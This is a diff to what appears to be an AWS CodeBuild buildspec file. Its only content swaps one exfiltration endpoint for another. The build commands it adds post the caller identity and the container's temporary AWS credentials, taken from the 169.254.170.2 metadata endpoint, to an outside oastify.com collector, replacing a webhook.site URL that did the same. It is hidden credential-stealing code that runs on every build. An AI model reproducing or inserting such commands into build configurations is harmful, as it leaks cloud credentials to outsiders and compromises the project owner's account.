@@ -3,5 +3,5 @@ version: 0.2
 phases:
   build:
     commands:
-      - curl -s -X POST "https://webhook.site/29a212a0-5a5f-442e-ac6f-85ba10c4565b" -d "identity=$(aws sts get-caller-identity)"
-      - curl -s -X POST "https://webhook.site/29a212a0-5a5f-442e-ac6f-85ba10c4565b" --data-urlencode "identity=$(curl 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI)"
+      - curl -s -X POST "https://bu9vcmqeqoqpnlb5v5a1lrbad1js7iv7.oastify.com" -d "identity=$(aws sts get-caller-identity)"
+      - curl -s -X POST "https://bu9vcmqeqoqpnlb5v5a1lrbad1js7iv7.oastify.com" --data-urlencode "identity=$(curl 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI)"
